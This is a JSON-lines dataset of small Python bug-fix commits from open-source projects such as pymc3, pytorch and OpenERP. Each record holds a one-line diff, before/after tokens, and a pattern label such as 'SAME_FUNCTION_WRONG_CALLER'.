{"project": "pymc3", "commit_sha": "1ef287a3bcf40391fa846c0330aea1f92971da7c", "parent_sha": "aff29f656fb6e3771f37360a07d5fc38855a88c1", "file_path": "pymc3/plots/energyplot.py", "project_url": "https://github.com/sk38897/pymc3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3,7 +3,7 @@ import numpy as np\n \n from .utils import fast_kde\n \n-def energyplot(trace, kind='kde', figsize=None, ax=None, legend=True, lw=0, alpha=0.5, frame=False, **kwargs):\n+def energyplot(trace, kind='kde', figsize=None, ax=None, legend=True, lw=0, alpha=0.5, frame=True, **kwargs):\n", "before": "def energyplot ( trace , kind = 'kde' , figsize = None , ax = None , legend = True , lw = 0 , alpha = 0.5 , frame = False , ** kwargs ) : ", "after": "def energyplot ( trace , kind = 'kde' , figsize = None , ax = None , legend = True , lw = 0 , alpha = 0.5 , frame = True , ** kwargs ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 88, 3, 99], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 94, 3, 99]]]"}
{"project": "visbrain", "commit_sha": "116f89f671904ab26e3a096f68646f661da8ee3b", "parent_sha": "471c5c6bc063b5f8ab164d696ea59d90ceba11fe", "file_path": "visbrain/objects/visbrain_obj.py", "project_url": "https://github.com/iraquitan/visbrain", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class VisbrainObject(object):\n         \"\"\"Return the object name.\"\"\"\n         return self._name\n \n-    def preview(self, bgcolor='white', axis=True, show=True):\n+    def preview(self, bgcolor='white', axis=False, show=True):\n", "before": "def preview ( self , bgcolor = 'white' , axis = True , show = True ) : ", "after": "def preview ( self , bgcolor = 'white' , axis = False , show = True ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 40, 3, 49], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 45, 3, 49]]]"}
{"project": "python-rt", "commit_sha": "8da875ec9d0e06387aa45f4302fe37c3ea6d9fb0", "parent_sha": "67c01692f284d89fdaefe30ff9dbfe02d213d02a", "file_path": "test_rt.py", "project_url": "https://github.com/inspirehep/python-rt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -161,7 +161,7 @@ class RtTestCase(unittest.TestCase):\n             # delete ticket\n             self.assertTrue(tracker.edit_ticket(ticket_id, Status='deleted'), 'Ticket delete failed.')\n             # get user\n-            self.assertEqual(self.get_user(params['default_login'])['EmailAddress'], params['default_login'] + '@no.mail', 'Bad user email received.')\n+            self.assertEqual(tracker.get_user(params['default_login'])['EmailAddress'], params['default_login'] + '@no.mail', 'Bad user email received.')\n \n if __name__ == '__main__':\n     unittest.main()\n", "before": "self . assertEqual ( self . get_user ( params [ 'default_login' ] ) [ 'EmailAddress' ] , params [ 'default_login' ] + '@no.mail' , 'Bad user email received.' )", "after": "self . assertEqual ( tracker . get_user ( params [ 'default_login' ] ) [ 'EmailAddress' ] , params [ 'default_login' ] + '@no.mail' , 'Bad user email received.' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 30, 3, 34], \"tracker\"]]"}
{"project": "openobject-server", "commit_sha": "badeba69d6b7368ae7069ab86bf9a59e48acdc8d", "parent_sha": "c5edeeb76b97df53229a214e313333c0695cfe98", "file_path": "bin/addons/base/module/module.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -231,7 +231,7 @@ class module(osv.osv):\n \t\t\t\t\t'shortdesc': terp.get('name', ''),\n \t\t\t\t\t'author': terp.get('author', 'Unknown'),\n \t\t\t\t\t'website': terp.get('website', ''),\n-\t\t\t\t\t'latest_version': terg.get('version', ''),\n+\t\t\t\t\t'latest_version': terp.get('version', ''),\n \t\t\t\t})\n \t\t\t\tself._update_dependencies(cr, uid, id, terp.get('depends', []))\n \t\t\t\tself._update_category(cr, uid, id, terp.get('category', 'Uncategorized'))\n", "before": "terg . get ( 'version' , '' ) ,", "after": "terp . get ( 'version' , '' ) ,", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:terg\", 3, 24, 3, 28], \"terp\"]]"}
{"project": "erp-empowering", "commit_sha": "b45f5bbd535bd8f47da0aac230b8f799a0013cc4", "parent_sha": "4afe69d7ea34be3bc5855f301ae147dc0bffc16f", "file_path": "addons/gisce/Misc/empowering_api/amon/utils.py", "project_url": "https://github.com/gisce/erp-empowering", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ def config_from_environment(env_prefix, env_required=None, **kwargs):\n     for env_key, value in os.environ.items():\n         env_key = env_key.upper()\n         if env_key.startswith(prefix):\n-            key = '_'.join(key.split('_')[1:]).lower()\n+            key = '_'.join(env_key.split('_')[1:]).lower()\n             config[key] = value\n     if env_required:\n         for required in env_required:\n", "before": "key = '_' . join ( key . split ( '_' ) [ 1 : ] ) . lower ( )", "after": "key = '_' . join ( env_key . split ( '_' ) [ 1 : ] ) . lower ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:key\", 3, 28, 3, 31], \"env_key\"]]"}
{"project": "openobject-server", "commit_sha": "66abf3540ecaeea01b0703c1fdc0eda639c86dc0", "parent_sha": "3cf2ed5322f69923f71692963c22bf39dfcde43c", "file_path": "openerp/addons/base/ir/osv_memory_autovacuum.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,6 +28,6 @@ class osv_memory_autovacuum(openerp.osv.osv.osv_memory):\n     def power_on(self, cr, uid, context=None):\n         for model in self.pool.models.values():\n             if model.is_transient():\n-                obj._transient_vacuum(cr, uid)\n+                model._transient_vacuum(cr, uid)\n         return True\n \n", "before": "obj . _transient_vacuum ( cr , uid )", "after": "model . _transient_vacuum ( cr , uid )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:obj\", 3, 17, 3, 20], \"model\"]]"}
{"project": "bob.db.mnist", "commit_sha": "f658f57c18ca68f6ceedee7d751cd6fd8ee7be11", "parent_sha": "9f3fb236cfab9065c21f89f45d019cc6993ab642", "file_path": "xbob/db/mnist/query.py", "project_url": "https://github.com/bioidiap/bob.db.mnist", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class Database():\n         from urllib2 import urlopen\n         with open(tmp_file, 'wb') as out_file:\n           response = urlopen(url)\n-          dfile.write(response.read())\n+          out_file.write(response.read())\n \n       else:\n         # python3 technique for downloading a file\n", "before": "dfile . write ( response . read ( ) )", "after": "out_file . write ( response . read ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:dfile\", 3, 11, 3, 16], \"out_file\"]]"}
{"project": "openobject-server", "commit_sha": "18c659bd018c5cbd0f69c140dae0ca0ecbeae6e7", "parent_sha": "d2415a120bc5bc980c301c8b2ba5b0a35ef80122", "file_path": "openerp/addons/base/res/res_users.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -222,7 +222,7 @@ class users(osv.osv):\n         return self.write(cr, uid, [id], {'avatar_stored': value}, context=context)\n     \n     def _avatar_resize(self, cr, uid, avatar, context=None):\n-        image_stream = io.BytesIO(avatar.decode('base64'))\n+        image_stream = io.BytesIO(avatar_stored.decode('base64'))\n         img = Image.open(image_stream)\n         img.thumbnail((180, 150), Image.ANTIALIAS)\n         img_stream = StringIO.StringIO()\n", "before": "image_stream = io . BytesIO ( avatar . decode ( 'base64' ) )", "after": "image_stream = io . BytesIO ( avatar_stored . decode ( 'base64' ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:avatar\", 3, 35, 3, 41], \"avatar_stored\"]]"}
{"project": "openobject-server", "commit_sha": "0493ccc64ca7818e32b87ed12f1b00f18dab499c", "parent_sha": "6df02845310f59701edaf7a3d8ba1dd66bbf4ddc", "file_path": "openerp/osv/fields.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1057,7 +1057,7 @@ class function(_column):\n             # This is not needed for stored fields and non-functional integer\n             # fields, as their values are constrained by the database backend\n             # to the same 32bits signed int limit.\n-            result = __builtins__.float(value)\n+            result = __builtin__.float(value)\n         return result\n \n     def get(self, cr, obj, ids, name, uid=False, context=None, values=None):\n", "before": "result = __builtins__ . float ( value )", "after": "result = __builtin__ . float ( value )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:__builtins__\", 3, 22, 3, 34], \"__builtin__\"]]"}
{"project": "homebrew-truck", "commit_sha": "af27177ee2f6e952b33c775c71f60767771a5709", "parent_sha": "fd972aaddd7252827a6cd597b3a218021181475f", "file_path": "truck.py", "project_url": "https://github.com/Mazyod/homebrew-truck", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -359,7 +359,7 @@ class TruckAuthor:\n         self.load_author_config()\n \n         # workaround adding directories with trailing slash\n-        path = path[:-1] if base_path.endswith(\"/\") else path\n+        path = path[:-1] if path.endswith(\"/\") else path\n \n         if not os.path.exists(path):\n             print(\"{} doesn't exist!\".format(path))\n", "before": "path = path [ : - 1 ] if base_path . endswith ( \"/\" ) else path", "after": "path = path [ : - 1 ] if path . endswith ( \"/\" ) else path", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:base_path\", 3, 29, 3, 38], \"path\"]]"}
{"project": "pyecharts", "commit_sha": "9d76bfeae471c244a22fb23f3c64276f3667a770", "parent_sha": "a029e76a5ee6b67565b4d350669249bfa211cf98", "file_path": "pyecharts/engine.py", "project_url": "https://github.com/yutiansut/pyecharts", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ def echarts_js_content(env, *charts):\n-    return Markup(LINK_SCRIPT_FORMATTER.format(generate_js_content(*charts)))\n+    return Markup(EMBED_SCRIPT_FORMATTER.format(generate_js_content(*charts)))\n \n \n @environmentfunction\n", "before": "return Markup ( LINK_SCRIPT_FORMATTER . format ( generate_js_content ( * charts ) ) )", "after": "return Markup ( EMBED_SCRIPT_FORMATTER . format ( generate_js_content ( * charts ) ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:LINK_SCRIPT_FORMATTER\", 0, 19, 0, 40], \"EMBED_SCRIPT_FORMATTER\"]]"}
{"project": "osf.io", "commit_sha": "2fd030d6c615c769cc53b576e5bd06ac16f650c0", "parent_sha": "d157d134f1dc25e340a8a585bd05a2f8dce03f13", "file_path": "website/search/elastic_search.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ def search(raw_query, start=0):\n         'projects': elastic.count(raw_query, index='website', doc_type='project')['count'],\n         'components': elastic.count(raw_query, index='website', doc_type='component')['count']\n     }\n-    raw_results = _elastic.search(query, index='website')\n+    raw_results = elastic.search(query, index='website')\n     results = [hit['_source'] for hit in raw_results['hits']['hits']]\n #    num_found = raw_results['hits']['total']\n     formatted_results, tags = create_result(results, counts)\n", "before": "raw_results = _elastic . search ( query , index = 'website' )", "after": "raw_results = elastic . search ( query , index = 'website' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:_elastic\", 3, 19, 3, 27], \"elastic\"]]"}
{"project": "osf.io", "commit_sha": "6d4a7ebc4c7c7b40ce8a52679243f1db45d34daa", "parent_sha": "87f3e6eb324aea3be25c8b99ec7d25a72c680a00", "file_path": "admin_tests/metrics/test_utils.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -204,7 +204,7 @@ class TestRenderToCSVResponse(AdminTestCase):\n         self.initial_static = [\n             'id,users,delta_users,unregistered_users,projects,delta_projects,public_projects,'\n             'delta_public_projects,registered_projects,delta_registered_projects,date\\r',\n-            '1,0,0,0,0,0,0,0,0,0,' + time_now.strftime('%Y-%m-%d %H:%M:%s.%f') + '\\r', '']\n+            '1,0,0,0,0,0,0,0,0,0,' + last_time.strftime('%Y-%m-%d %H:%M:%s.%f') + '\\r', '']\n \n     def test_render_to_csv_response(self):\n         queryset = OSFWebsiteStatistics.objects.all().order_by('-date')\n", "before": "self . initial_static = [ 'id,users,delta_users,unregistered_users,projects,delta_projects,public_projects,' 'delta_public_projects,registered_projects,delta_registered_projects,date\\r' , '1,0,0,0,0,0,0,0,0,0,' + time_now . strftime ( '%Y-%m-%d %H:%M:%s.%f' ) + '\\r' , '' ]", "after": "self . initial_static = [ 'id,users,delta_users,unregistered_users,projects,delta_projects,public_projects,' 'delta_public_projects,registered_projects,delta_registered_projects,date\\r' , '1,0,0,0,0,0,0,0,0,0,' + last_time . strftime ( '%Y-%m-%d %H:%M:%s.%f' ) + '\\r' , '' ]", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:time_now\", 3, 38, 3, 46], \"last_time\"]]"}
{"project": "osf.io", "commit_sha": "5b6cc8b919fd00610f02f3edd72e27d64d6d9221", "parent_sha": "150eabf62157d7df096826b63e2031ed77706714", "file_path": "framework/auth/cas.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -322,7 +322,7 @@ def get_user_from_cas_resp(cas_resp):\n     from osf.models import OSFUser\n     if cas_resp.user:\n-        user = User.load(cas_resp.user)\n+        user = OSFUser.load(cas_resp.user)\n         # cas returns a valid OSF user id\n         if user:\n             return user, None, 'authenticate'\n", "before": "user = User . load ( cas_resp . user )", "after": "user = OSFUser . load ( cas_resp . user )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:User\", 2, 16, 2, 20], \"OSFUser\"]]"}
{"project": "python-github-api", "commit_sha": "8671cea38acbd78410c051c008a7383a3003ab8b", "parent_sha": "c7a9202d30579df8979983901730d562bf643d1a", "file_path": "Lib/xml/sax/saxutils.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ def prepare_input_source(source, base = \"\"):\n         source = xmlreader.InputSource()\n         source.setByteStream(f)\n         if hasattr(f, \"name\"):\n-            f.setSystemId(f.name)\n+            source.setSystemId(f.name)\n \n     if source.getByteStream() is None:\n         sysid = source.getSystemId()\n", "before": "f . setSystemId ( f . name )", "after": "source . setSystemId ( f . name )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:f\", 3, 13, 3, 14], \"source\"]]"}
{"project": "python-github-api", "commit_sha": "bf2afa6cbe5c3f79ef9369cb97bbe0b7c8fc43f1", "parent_sha": "ca4b854612191e59c6806e0a55f6ac7550813adf", "file_path": "Lib/test/test_shelve.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class TestShelveBase(mapping_tests.BasicTestMappingProtocol):\n         self._db = []\n         if not self._in_mem:\n             for f in glob.glob(self.fn+\"*\"):\n-                os.unlink(f)\n+                test_support.unlink(f)\n \n class TestAsciiFileShelve(TestShelveBase):\n     _args={'protocol':0}\n", "before": "os . unlink ( f )", "after": "test_support . unlink ( f )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:os\", 3, 17, 3, 19], \"test_support\"]]"}
{"project": "python-github-api", "commit_sha": "2479cc54d3b6db2372394790cd36e80979e6b0c7", "parent_sha": "98944dedeae7b88d4eb42174885369402544baf5", "file_path": "Lib/test/test_audioop.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ class TestAudioop(unittest.TestCase):\n \n     def test_minmax(self):\n         self.assertEqual(audioop.minmax(data[0], 1), (0, 2))\n-        Self.assertEqual(audioop.minmax(data[1], 2), (0, 2))\n+        self.assertEqual(audioop.minmax(data[1], 2), (0, 2))\n         self.assertEqual(audioop.minmax(data[2], 4), (0, 2))\n \n     def test_maxpp(self):\n", "before": "Self . assertEqual ( audioop . minmax ( data [ 1 ] , 2 ) , ( 0 , 2 ) )", "after": "self . assertEqual ( audioop . minmax ( data [ 1 ] , 2 ) , ( 0 , 2 ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:Self\", 3, 9, 3, 13], \"self\"]]"}
{"project": "OpenBazaar", "commit_sha": "9202f73bf3d59db9206045b0f841664819aea110", "parent_sha": "75a7901d8e48d4bd403b4fa6bae9b536ac43cf83", "file_path": "node/market.py", "project_url": "https://github.com/roguesupport/OpenBazaar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -323,7 +323,7 @@ class Market(object):\n             contract = listing.get('Contract')\n             keywords = contract.get('item_keywords') if contract is not None else []\n \n-            t3 = Thread(target=self.update_keywords_on_network, args=(listings.get('key'), keywords,))\n+            t3 = Thread(target=self.update_keywords_on_network, args=(listing.get('key'), keywords,))\n             t3.start()\n \n         self.update_listings_index()\n", "before": "t3 = Thread ( target = self . update_keywords_on_network , args = ( listings . get ( 'key' ) , keywords , ) )", "after": "t3 = Thread ( target = self . update_keywords_on_network , args = ( listing . get ( 'key' ) , keywords , ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:listings\", 3, 71, 3, 79], \"listing\"]]"}
{"project": "OpenBazaar", "commit_sha": "746a382d8edbd6c13fa4eea8b6cb5a57e86a7c4a", "parent_sha": "b8e22e20bc66184feb82bc4412889e1e911e90b4", "file_path": "node/connection.py", "project_url": "https://github.com/roguesupport/OpenBazaar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -358,7 +358,7 @@ class CryptoPeerListener(PeerListener):\n             except RuntimeError as e:\n                 self.log.error('Could not decrypt message properly %s', e)\n \n-                if not CryptoPeerConnection.is_handshake(message):\n+                if not self.is_handshake(message):\n                     return None\n         else:\n             message = json.loads(serialized)\n", "before": "if not CryptoPeerConnection . is_handshake ( message ) : return None else : message = json . loads ( serialized )", "after": "if not self . is_handshake ( message ) : return None else : message = json . loads ( serialized )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:CryptoPeerConnection\", 3, 24, 3, 44], \"self\"]]"}
{"project": "moul-scripts", "commit_sha": "93841c599d05d79a9f41e7214fef100440a456f6", "parent_sha": "1dae424a2133c3490d2aeffd467ec9e4db092aee", "file_path": "Python/grtzMarkerScopeGUI.py", "project_url": "https://github.com/Mirphak/moul-scripts", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -168,7 +168,7 @@ class grtzMarkerScopeGUI(ptModifier):\n             except:\n                 return\n             try:\n-                mission = int(msg.getName()[-2:])\n+                mission = int(score.getName()[-2:])\n             except:\n                 PtDebugPrint(\"grtzMarkerScopeGUI.OnGameScoreMsg():\\tTITS! '{}' didn't match.\".format(score.getName()))\n                 return\n", "before": "mission = int ( msg . getName ( ) [ - 2 : ] )", "after": "mission = int ( score . getName ( ) [ - 2 : ] )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:msg\", 3, 31, 3, 34], \"score\"]]"}
{"project": "bpython", "commit_sha": "09f905f40b51e81e55e8ed2035ef0ffb4bf27b4c", "parent_sha": "61d7ba886fdbdd5dbe1671e4d2acaa6ca02b8dec", "file_path": "bpython/curtsiesfrontend/repl.py", "project_url": "https://github.com/thomasballinger/bpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -690,7 +690,7 @@ class Repl(BpythonRepl):\n             self.on_enter()\n             while self.fake_refresh_requested:\n                 self.fake_refresh_requested = False\n-                self.process_event(events.RefreshRequestEvent())\n+                self.process_event(bpythonevents.RefreshRequestEvent())\n         elif isinstance(e, events.Event):\n             pass # ignore events\n         elif e == '<SPACE>':\n", "before": "self . process_event ( events . RefreshRequestEvent ( ) )", "after": "self . process_event ( bpythonevents . RefreshRequestEvent ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:events\", 3, 36, 3, 42], \"bpythonevents\"]]"}
{"project": "kimeo", "commit_sha": "aca12b4e57102e898072496b7dd90aec437d05e0", "parent_sha": "3e39b4e0d416e2042fe13b7acd11b4cb713e23fa", "file_path": "KimeoApp/RobotCommunication.py", "project_url": "https://github.com/AMontagu/kimeo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class RobotCommunication:\n         face = dataSerialized.data['imageName'] #data['imageName'], data['stay'], data['timeToStay']\n         print(face)\n         actionOnJson = ActionOnJson(fileForScreen)\n-        actionJson.writeJson(dataSerialized)\n+        actionOnJson.writeJson(dataSerialized)\n \n     def makeSound(self, dataSerialized):\n         sound = dataSerialized.data['soundName']  # data['soundName'], data['repeat']\n", "before": "actionJson . writeJson ( dataSerialized )", "after": "actionOnJson . writeJson ( dataSerialized )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:actionJson\", 3, 9, 3, 19], \"actionOnJson\"]]"}
{"project": "picard", "commit_sha": "c449056ce53e9ee68556070d9dd62073838b019e", "parent_sha": "583d5a54270f19ac1c8d7f69063571ad1a733aca", "file_path": "picard/ui/itemviews.py", "project_url": "https://github.com/phw/picard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ def register_cluster_action(action):\n     _cluster_actions.register(action.__module__, action)\n \n def register_clusterlist_action(action):\n-    _cluster_actions.register(action.__module__, action)\n+    _clusterlist_actions.register(action.__module__, action)\n \n def register_track_action(action):\n     _track_actions.register(action.__module__, action)\n", "before": "_cluster_actions . register ( action . __module__ , action )", "after": "_clusterlist_actions . register ( action . __module__ , action )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:_cluster_actions\", 3, 5, 3, 21], \"_clusterlist_actions\"]]"}
{"project": "picard", "commit_sha": "f7f7f109de08e396ddb19f1ea8106f0b70b724ed", "parent_sha": "5115c48930358a5d9e72e11ca7330c34f10f217b", "file_path": "picard/ui/itemviews.py", "project_url": "https://github.com/phw/picard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -282,7 +282,7 @@ class FingerprintColumnWidget(QtWidgets.QWidget):\n \n     def paintEvent(self, event=None):\n         painter = QtGui.QPainter(self)\n-        paint_fingerprint_icon(painter, event.rect(), self.decide_icon())\n+        paint_fingerprint_icon(painter, self.rect(), self.decide_icon())\n \n     def decide_icon(self):\n         if getattr(self._file, 'acoustid_fingerprint', None):\n", "before": "paint_fingerprint_icon ( painter , event . rect ( ) , self . decide_icon ( ) )", "after": "paint_fingerprint_icon ( painter , self . rect ( ) , self . decide_icon ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:event\", 3, 41, 3, 46], \"self\"]]"}
{"project": "blender-addons-contrib", "commit_sha": "a50b036252d26762eb04edfa00510e9ece5f3032", "parent_sha": "4b5cee6a6b40dfbab3b366257bcde76bd2a3591e", "file_path": "mesh_select_vertex_groups.py", "project_url": "https://github.com/scorpion81/blender-addons-contrib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -166,7 +166,7 @@ def found_verts(vertex_group):\n     if vertex_group == 'no group':\n         for v in obj.data.vertices:\n             if v.index in used_vertexes and len(v.groups) == 0:\n-                gfound.append(v)\n+                vgfound.append(v)\n     else:\n         vgnum = -1\n         for vg in obj.vertex_groups:\n", "before": "gfound . append ( v )", "after": "vgfound . append ( v )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:gfound\", 3, 17, 3, 23], \"vgfound\"]]"}
{"project": "casperfpga", "commit_sha": "47b52b9556a653cc0072e365da8767aa71397f28", "parent_sha": "4c304da41dacb9565b457cf252792f865b9c7612", "file_path": "src/snapadc.py", "project_url": "https://github.com/casper-astro/casperfpga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -215,7 +215,7 @@ class SNAPADC(object):\n         modeMap = {4:0, 2:1, 1:2} # mapping of numChannel to mode\n-        if numChannel not in mode.keys():\n+        if numChannel not in modeMap.keys():\n             raise ValueError(\"Invalid parameter\")\n         mode = modeMap[numChannel]\n         val = self._set(0x0, mode,  self.M_WB_W_DEMUX_MODE)\n", "before": "if numChannel not in mode . keys ( ) : raise ValueError ( \"Invalid parameter\" )", "after": "if numChannel not in modeMap . keys ( ) : raise ValueError ( \"Invalid parameter\" )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:mode\", 1, 30, 1, 34], \"modeMap\"]]"}
{"project": "pytorch", "commit_sha": "fd6d11ae6647363fc27ef1815f40c6ce8db79d40", "parent_sha": "46374ad5c8739f9c186d74aaf2cfeca09cced453", "file_path": "torch/nn/functional.py", "project_url": "https://github.com/ezyang/pytorch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1352,7 +1352,7 @@ def nll_loss(input, target, weight=None, size_average=True, ignore_index=-100, r\n         out_size = (n,) + input.size()[2:]\n         if target.size()[1:] != input.size()[2:]:\n             raise ValueError('Expected target size {}, got {}'.format(\n-                out_size, input.size()))\n+                out_size, target.size()))\n         input = input.contiguous().view(n, c, 1, -1)\n         target = target.contiguous().view(n, 1, -1)\n         if reduce:\n", "before": "raise ValueError ( 'Expected target size {}, got {}' . format ( out_size , input . size ( ) ) )", "after": "raise ValueError ( 'Expected target size {}, got {}' . format ( out_size , target . size ( ) ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:input\", 3, 27, 3, 32], \"target\"]]"}
{"project": "iterative-Random-Forest", "commit_sha": "603ff1a61d2d3d08624e18b32d05c177711d7299", "parent_sha": "33a9bcac38caf4743c81cbea0a72b3b70a1fa57d", "file_path": "sklearn/tree/tests/test_tree.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -334,7 +334,7 @@ def test_pure_set():\n     for name, TreeRegressor in REG_TREES.items():\n         reg = TreeRegressor(random_state=0)\n         reg.fit(X, y)\n-        assert_almost_equal(clf.predict(X), y,\n+        assert_almost_equal(reg.predict(X), y,\n                             err_msg=\"Failed with {0}\".format(name))\n \n \n", "before": "assert_almost_equal ( clf . predict ( X ) , y , err_msg = \"Failed with {0}\" . format ( name ) )", "after": "assert_almost_equal ( reg . predict ( X ) , y , err_msg = \"Failed with {0}\" . format ( name ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:clf\", 3, 29, 3, 32], \"reg\"]]"}
{"project": "coldfront", "commit_sha": "89020349006b82a37400a36601b4d4eceebd15f6", "parent_sha": "06aaab3a76c386aa1feadcdb9602914da0870d65", "file_path": "coldfront/core/allocation/views.py", "project_url": "https://github.com/ubccr/coldfront", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -291,7 +291,7 @@ class AllocationDetailView(LoginRequiredMixin, UserPassesTestMixin, TemplateView\n \n                     email_receiver_list = []\n                     for allocation_user in allocation_obj.allocationuser_set.exclude(status__name__in=['Removed', 'Error']):\n-                        allocation_activate_user.send(\n+                        allocation_remove_user.send(\n                             sender=self.__class__, allocation_user_pk=allocation_user.pk)\n                         if allocation_user.allocation.project.projectuser_set.get(user=allocation_user.user).enable_notifications:\n                             email_receiver_list.append(\n", "before": "allocation_activate_user . send ( sender = self . __class__ , allocation_user_pk = allocation_user . pk )", "after": "allocation_remove_user . send ( sender = self . __class__ , allocation_user_pk = allocation_user . pk )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:allocation_activate_user\", 3, 25, 3, 49], \"allocation_remove_user\"]]"}
{"project": "PyBNF", "commit_sha": "91506e0b770104783ee45b46e77bc84ace22673d", "parent_sha": "588858844e2e2b9fc9e942039118695fa69f5770", "file_path": "pybnf/pset.py", "project_url": "https://github.com/lanl/PyBNF", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -383,7 +383,7 @@ class FreeParameter(object):\n                 self.value = self.lower_bound\n             # reflective number line, can never realize self.lower_bound or self.upper_bound this way\n             adj = self._reflect(self.value, new_value - self.value)\n-            logging.warning('Assigned value %f is out of defined bounds.  Adjusted to %f' % (new_value, adj))\n+            logger.warning('Assigned value %f is out of defined bounds.  Adjusted to %f' % (new_value, adj))\n             new_value = adj\n         return FreeParameter(self.name, self.type, self.p1, self.p2, new_value, self.bounded)\n \n", "before": "logging . warning ( 'Assigned value %f is out of defined bounds.  Adjusted to %f' % ( new_value , adj ) )", "after": "logger . warning ( 'Assigned value %f is out of defined bounds.  Adjusted to %f' % ( new_value , adj ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:logging\", 3, 13, 3, 20], \"logger\"]]"}
